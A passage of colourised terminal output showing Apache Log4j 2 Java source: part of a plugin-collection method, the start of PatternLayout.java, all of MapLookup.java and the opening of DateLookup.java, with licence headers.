[2;36m                    [0m         [1;36m117[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:     * Returns all the matching plugins.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:     * @return A Map containing the name of the plugin and its type.[0m            [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:    public Map<String, PluginType> [0m[1;35mgetPlugins[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                               [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:        return plugins;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m123[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m124[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m125[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m126[0m[39m:     * Locates all the plugins.[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m127[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m128[0m[39m:    public void [0m[1;35mcollectPlugins[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m129[0m[39m:        [0m[1;35mcollectPlugins[0m[1;39m([0m[39mtrue, null[0m[1;39m)[0m[39m;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m130[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m131[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m132[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m133[0m[39m:     * Collects plugins, optionally obtaining them from a preload map.[0m          [2m                [0m
[2;36m                    [0m         [1;36m134[0m[39m:     * @param preLoad if true, plugins will be obtained from the preload map.[0m   [2m                [0m
[2;36m                    [0m         [1;36m135[0m[39m:     * @param pkgs A comma separated list of package names to scan for plugins.[0m [2m                [0m
[2;36m                    [0m         [39mIf[0m                                                                                  [2m                [0m
[2;36m                    [0m         [1;36m136[0m[39m:     * null the default Log4j package name will be used.[0m                        [2m                [0m
[2;36m                    [0m         [1;36m137[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m138[0m[39m:    @[0m[1;35mSuppressWarnings[0m[1;39m([0m[32m"unchecked"[0m[1;39m)[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m139[0m[39m:    public void [0m[1;35mcollectPlugins[0m[1;39m([0m[39mboolean preLoad, final String pkgs[0m[1;39m)[0m[39m [0m[1;39m{[0m            [2m                [0m
[2;36m                    [0m         [1;36m140[0m[39m:        if [0m[1;39m([0m[1;35mpluginTypeMap.containsKey[0m[1;39m([0m[39mtype[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m141[0m[39m:            plugins = [0m[1;35mpluginTypeMap.get[0m[1;39m([0m[39mtype[0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m142[0m[39m:            preLoad = false;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m143[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m144[0m[39m:        final long start = [0m[1;35mSystem.nanoTime[0m[1;39m([0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m145[0m[39m:        final ResolverUtil resolver = new [0m[1;35mResolverUtil[0m[1;39m([0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m146[0m[39m:        final ClassLoader loader = [0m[1;35mLoader.getClassLoader[0m[1;39m([0m[1;39m)[0m[39m;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m147[0m[39m:        if [0m[1;39m([0m[39mloader != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m148[0m[39m:            [0m[1;35mresolver.setClassLoader[0m[1;39m([0m[39mloader[0m[1;39m)[0m[39m;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m149[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m150[0m[39m:        if [0m[1;39m([0m[39mpreLoad[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                          [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/layout/PatternLayout.jav[0m[1;92ma:1[0m[39m-[0m[1;36m80[0m     [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.layout;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.nio.charset.Charset;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import java.util.HashMap;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import java.util.List;[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import java.util.Map;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import org.apache.logging.log4j.core.config.Configuration;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginAttr;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginConfiguration;[0m         [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginElement;[0m               [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginFactory;[0m               [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:import org.apache.logging.log4j.core.helpers.Charsets;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:import org.apache.logging.log4j.core.helpers.OptionConverter;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:import org.apache.logging.log4j.core.pattern.LogEventPatternConverter;[0m           [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:import org.apache.logging.log4j.core.pattern.PatternFormatter;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:import org.apache.logging.log4j.core.pattern.PatternParser;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:import org.apache.logging.log4j.core.pattern.RegexReplacement;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m: * <p>A flexible layout configurable with pattern string. The goal of this class[0m [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m: * is to [0m[1;39m{[0m[39m@link org.apache.logging.log4j.core.Layout#toByteArray format[0m[1;39m}[0m[39m a [0m      [2m                [0m
[2;36m                    [0m         [1;39m{[0m[39m@link LogEvent[0m[1;39m}[0m[39m and return the results.[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m: * The format of the result depends on the <em>conversion pattern<[0m[35m/[0m[95mem[0m[39m>.[0m          [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m: * <p/>[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m: * <p>The conversion pattern is closely related to the conversion[0m                [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m: * pattern of the printf function in C. A conversion pattern is[0m                  [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m: * composed of literal text and format control expressions called[0m                [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m: * <em>conversion specifiers<[0m[35m/[0m[95mem[0m[39m>.[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m: * See the Log4j Manual for details on the supported pattern converters.[0m         [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"PatternLayout"[0m[39m, category = [0m[32m"Core"[0m[39m, elementType = [0m[32m"layout"[0m[39m, [0m      [2m                [0m
[2;36m                    [0m         [39mprintObject = true[0m[1;39m)[0m                                                                 [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:public final class PatternLayout extends AbstractStringLayout [0m[1;39m{[0m                  [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:     * Default pattern string for log output. Currently set to the[0m               [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:     * string <b>[0m[32m"%m%n"[0m[39m<[0m[35m/[0m[95mb[0m[39m> which just prints the application supplied[0m           [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:     * message.[0m                                                                  [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:    public static final String DEFAULT_CONVERSION_PATTERN = [0m[32m"%m%n"[0m[39m;[0m              [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:     * A conversion pattern equivalent to the TTCCCLayout.[0m                       [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:     * Current value is <b>%r [0m[1;39m[[0m[39m%t[0m[1;39m][0m[39m %p %c %x - %m%n<[0m[35m/[0m[95mb[0m[39m>.[0m                          [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    public static final String TTCC_CONVERSION_PATTERN =[0m                         [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[32m"%r [0m[32m[[0m[32m%t[0m[32m][0m[32m %p %c %x - %m%n"[0m[39m;[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:     * A simple pattern.[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:     * Current value is <b>%d [0m[1;39m[[0m[39m%t[0m[1;39m][0m[39m %p %c - %m%n<[0m[35m/[0m[95mb[0m[39m>.[0m                             [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:    public static final String SIMPLE_CONVERSION_PATTERN =[0m                       [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:        [0m[32m"%d [0m[32m[[0m[32m%t[0m[32m][0m[32m %p %c - %m%n"[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:    [0m[35m/[0m[39m** Key to identify pattern converters. *[0m[35m/[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:    public static final String KEY = [0m[32m"Converter"[0m[39m;[0m                                [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:     * Initial converter for pattern.[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:    private List<PatternFormatter> formatters;[0m                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/MapLookup.jav[0m[1;92ma:1[0m[39m-[0m[1;36m88[0m         [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.util.Map;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.message.MapMessage;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m: * The basis for a lookup based on a Map.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"map"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:public class MapLookup implements StrLookup [0m[1;39m{[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:     * Map keys are variable names and value.[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    private final Map<String, String> map;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:     * Creates a new instance backed by a Map. Used by the default lookup.[0m       [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:     *[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * @param map the map of keys to values, may be null[0m                         [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    public [0m[1;35mMapLookup[0m[1;39m([0m[39mfinal Map<String, String> map[0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:        this.map = map;[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:     * Constructor when used directly as a plugin.[0m                               [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:    public [0m[1;35mMapLookup[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:        this.map = null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:     * Looks up a String key to a String value using the map.[0m                    [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:     * <p/>[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:     * If the map is null, then null is returned.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:     * The map result object is converted to a string using [0m[1;35mtoString[0m[1;39m([0m[1;39m)[0m[39m.[0m          [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:     *[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:     * @param key the key to be looked up, may be null[0m                           [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:     * @return the matching value, null if no match[0m                              [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        if [0m[1;39m([0m[39mmap == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        final String obj = [0m[1;35mmap.get[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:        if [0m[1;39m([0m[39mobj == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:        return obj;[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        if [0m[1;39m([0m[39mmap == null && ![0m[1;39m([0m[1;35mevent.getMessage[0m[1;39m([0m[1;39m)[0m[39m instanceof MapMessage[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m        [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:        if [0m[1;39m([0m[39mmap != null && [0m[1;35mmap.containsKey[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                               [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:            final String obj = [0m[1;35mmap.get[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:            if [0m[1;39m([0m[39mobj != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:                return obj;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:        if [0m[1;39m([0m[1;35mevent.getMessage[0m[1;39m([0m[1;39m)[0m[39m instanceof MapMessage[0m[1;39m)[0m[39m [0m[1;39m{[0m                          [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:            return [0m[1;39m([0m[1;39m([0m[39mMapMessage[0m[1;39m)[0m[39m [0m[1;35mevent.getMessage[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[1;35m.get[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:        return null;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/DateLookup.jav[0m[1;92ma:1[0m[39m-[0m[1;36m70[0m        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.text.DateFormat;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import java.text.SimpleDateFormat;[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import java.util.Date;[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.Logger;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import org.apache.logging.log4j.status.StatusLogger;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m: * Formats the current date or the date in the LogEvent. The [0m[32m"key"[0m[39m is used as [0m   [2m                [0m
[2;36m                    [0m         [39mthe format String.[0m                                                                  [2m                [0m
